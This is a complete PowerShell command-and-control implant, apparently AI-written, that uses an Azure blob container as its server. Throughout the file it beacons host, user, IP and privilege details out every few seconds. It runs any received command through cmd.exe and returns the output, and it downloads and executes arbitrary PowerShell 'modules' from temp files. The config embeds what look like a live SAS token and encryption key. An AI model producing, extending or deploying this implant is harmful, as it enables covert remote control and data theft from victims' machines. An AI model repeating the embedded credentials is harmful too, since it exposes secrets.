<#
    PowerShell C2 Agent for Azure Blob Storage (AES-256-CBC, Compatible with your backend)
    Author: ChatGPT
    Usage: Save as agent.ps1, edit config section, run as needed.
#>

# --- CONFIG SECTION ---
$Config = @{
    BlobServiceUrl = "https://7200727c9853435e09121991.blob.core.windows.net/mycontainer"   # Without trailing slash!
    SasToken       = "?sv=2024-11-04&ss=bqt&srt=sco&sp=lacupiytfx&se=2025-12-08T07:46:36Z&st=2025-08-04T22:31:36Z&spr=https&sig=1rUgcYc4kBVqqP4fb4jLStfGSxtOsrmQX5FApD0SnAo%3D"
    EncryptionKey  = "c2320c6d5b5fb6a600cbc0673e7243596c4f0f32c7d7c5db72afc67486a51" # Must be 64 hex chars
    BeaconInterval = 5 # Seconds between each loop
}

# --- UTILITY FUNCTIONS ---

function Get-EncryptionKeyBytes {
    param([string]$Key)
    # Ensure key is 64 characters long (32 bytes in hex)
    if ($Key.Length -ne 64) {
        Write-Warning "EncryptionKey should be 64 hexadecimal characters long."
        return [System.Text.Encoding]::UTF8.GetBytes($Key.PadRight(32, '0').Substring(0,32))
    }
    $bytes = New-Object byte[] 32
    for ($i = 0; $i -lt 32; $i++) {
        $hexPair = $Key.Substring($i * 2, 2)
        $bytes[$i] = [System.Convert]::ToByte($hexPair, 16)
    }
    return $bytes
}

function Encrypt-Data {
    param(
        [string]$Plaintext,
        [byte[]]$KeyBytes
    )
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = "CBC"
    $aes.Padding = "PKCS7"
    $aes.Key = $KeyBytes
    $iv = New-Object byte[] 16
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($iv)
    $aes.IV = $iv
    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Plaintext)
    $encryptor = $aes.CreateEncryptor()
    $cipherBytes = $encryptor.TransformFinalBlock($plainBytes,0,$plainBytes.Length)
    $allBytes = $iv + $cipherBytes
    [System.Convert]::ToBase64String($allBytes)
}

function Decrypt-Data {
    param(
        [string]$Base64Data,
        [byte[]]$KeyBytes
    )
    $allBytes = [System.Convert]::FromBase64String($Base64Data)
    $iv = $allBytes[0..15]
    $cipher = $allBytes[16..($allBytes.Length-1)]
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = "CBC"
    $aes.Padding = "PKCS7"
    $aes.Key = $KeyBytes
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    $plainBytes = $decryptor.TransformFinalBlock($cipher,0,$cipher.Length)
    [System.Text.Encoding]::UTF8.GetString($plainBytes)
}

function Invoke-AzureBlobPUT {
    param(
        [string]$BlobName,
        [string]$Content
    )
    $uri = "$($Config.BlobServiceUrl)/$BlobName$($Config.SasToken)"
    $headers = @{
        "x-ms-blob-type" = "BlockBlob"
    }
    try {
        Invoke-RestMethod -Uri $uri -Method Put -Headers $headers -Body $Content -ContentType "application/octet-stream" -ErrorAction Stop | Out-Null
        return $true
    } catch {
        return $false
    }
}

function Invoke-AzureBlobGET {
    param(
        [string]$BlobName
    )
    $uri = "$($Config.BlobServiceUrl)/$BlobName$($Config.SasToken)"
    try {
        $resp = Invoke-RestMethod -Uri $uri -Method Get -ErrorAction Stop
        return $resp
    } catch {
        if ($_.Exception.Response.StatusCode.value__ -eq 404) { return $null }
        return $null
    }
}

function Remove-AzureBlob {
    param(
        [string]$BlobName
    )
    $uri = "$($Config.BlobServiceUrl)/$BlobName$($Config.SasToken)"
    try {
        Invoke-RestMethod -Uri $uri -Method Delete -ErrorAction Stop | Out-Null
        return $true
    } catch {
        return $false
    }
}

function List-AzureBlobs {
    param(
        [string]$Prefix
    )
    $sas = $Config.SasToken
    if ($sas.StartsWith("?")) { $sas = $sas.Substring(1) }
    $uri = "$($Config.BlobServiceUrl)?restype=container&comp=list&prefix=$Prefix&$sas"

    try {
        $response = Invoke-WebRequest -Uri $uri -Method Get -ErrorAction Stop
        $bytes = $response.RawContentStream.ToArray()
        $xmlText = [System.Text.Encoding]::UTF8.GetString($bytes)
        $xmlText = $xmlText -replace "^\uFEFF", ""
        $xmlText = $xmlText.Trim()
        $xmlDoc = [xml]$xmlText
        $blobList = @()
        foreach ($blob in $xmlDoc.EnumerationResults.Blobs.Blob) {
            $blobList += $blob.Name
        }
        return $blobList
    } catch {
        return @()
    }
}

# --- AGENT LOGIC FUNCTIONS ---

function Get-LocalIP {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Ethernet*','Wi-Fi*' | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1 -ExpandProperty IPAddress)
    if (-not $ip) { $ip = "Unknown" }
    return $ip
}

function Build-CheckinJSON {
    $hostname = $env:COMPUTERNAME
    $user = $env:USERNAME
    $os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    $arch = (Get-WmiObject Win32_Processor).AddressWidth
    $procid = $PID
    $principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $priv = "admin"
    } else {
        $priv = "user"
    }
    $curdir = (Get-Location).Path
    $ip = Get-LocalIP
    $now = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    return @{
        hostname = $hostname
        ip_address = $ip
        username = $user
        operating_system = $os
        architecture = "x$arch"
        process_id = $procid
        privilege_level = $priv
        current_directory = $curdir
        timestamp = $now
    } | ConvertTo-Json -Compress
}

function Run-Command {
    param([string]$cmd)
    try {
        $start = Get-Date
        $output = cmd.exe /c $cmd 2>&1
        $time = [int]((Get-Date) - $start).TotalMilliseconds
        return @{output = $output; status = "executed"; time = $time}
    } catch {
        return @{output = $_.Exception.Message; status = "failed"; time = 0}
    }
}

# --- MAIN AGENT LOOP ---

$keyBytes = Get-EncryptionKeyBytes $Config.EncryptionKey
$hostname = $env:COMPUTERNAME

while ($true) {
    # 1. CHECK-IN
    $checkinJson = Build-CheckinJSON
    $encCheckin = Encrypt-Data -Plaintext $checkinJson -KeyBytes $keyBytes
    $checkinBlob = "agent_${hostname}_checkin.enc"
    Invoke-AzureBlobPUT -BlobName $checkinBlob -Content $encCheckin

    # 2. CHECK FOR COMMANDS
    $commandPrefix = "agent_${hostname}_command_"
    $commandBlobs = List-AzureBlobs -Prefix $commandPrefix
    if ($null -eq $commandBlobs) { $commandBlobs = @() }
    Write-Host ("commandBlobs count: {0}" -f $commandBlobs.Count)
    foreach ($cmdBlob in $commandBlobs) {
        $encCmdJson = Invoke-AzureBlobGET -BlobName $cmdBlob
        if ($null -eq $encCmdJson) { continue }
        try {
            $decryptedText = Decrypt-Data -Base64Data $encCmdJson -KeyBytes $keyBytes
            $cmdJson = $decryptedText | ConvertFrom-Json
            $cmdId = $cmdJson.id
            $cmdText = $cmdJson.command
        } catch {
            Remove-AzureBlob -BlobName $cmdBlob
            continue
        }

        # Execute command
        $res = Run-Command $cmdText
$resultObj = @{
    command_id = $cmdId
    output = ($res.output -join "`r`n")     # Proper Windows newlines!
    status = $res.status
    execution_time = $res.time
    timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
}
        # PRINT THE RESULT JSON (PLAIN)
        Write-Host ($resultObj | ConvertTo-Json -Compress)

        $encResult = Encrypt-Data -Plaintext ($resultObj | ConvertTo-Json -Compress) -KeyBytes $keyBytes
        $resultBlob = "result_${cmdId}.enc"
        Invoke-AzureBlobPUT -BlobName $resultBlob -Content $encResult

        # Cleanup command blob
        Remove-AzureBlob -BlobName $cmdBlob
    }

    # 3. CHECK FOR MODULES
    $modulePrefix = "agent_${hostname}_module_"
    $moduleBlobs = List-AzureBlobs -Prefix $modulePrefix
    if ($null -eq $moduleBlobs) { $moduleBlobs = @() }
    foreach ($modBlob in $moduleBlobs) {
        $encModData = Invoke-AzureBlobGET -BlobName $modBlob
        if ($null -eq $encModData) { continue }
        try {
            $modBytes = [System.Text.Encoding]::UTF8.GetBytes((Decrypt-Data -Base64Data $encModData -KeyBytes $keyBytes))
        } catch {
            $modBytes = [System.Convert]::FromBase64String($encModData)
        }
        $tmpFile = Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName() + ".ps1")
        [System.IO.File]::WriteAllBytes($tmpFile, $modBytes)
        try {
            & $tmpFile
        } catch {
        }
        Remove-Item $tmpFile -Force
        Remove-AzureBlob -BlobName $modBlob
    }

    Start-Sleep -Seconds $Config.BeaconInterval
}

# END
